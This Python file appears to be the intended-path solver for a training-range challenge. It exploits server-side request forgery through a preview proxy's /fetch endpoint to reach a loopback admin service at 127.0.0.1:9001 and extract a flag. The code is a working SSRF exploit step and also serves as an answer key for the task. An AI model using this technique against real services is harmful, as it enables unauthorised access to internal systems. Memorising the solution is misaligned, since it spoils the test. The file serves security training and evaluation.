"""Intended-path solver: SSRF from the preview proxy into the loopback admin service."""

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    res = httpx.get(
        f"{ctx.url()}/fetch",
        params={"url": "http://127.0.0.1:9001/admin"},
        timeout=10,
    )
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="ssrf-admin",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else "proxy response did not yield the flag",
            )
        ]
    )
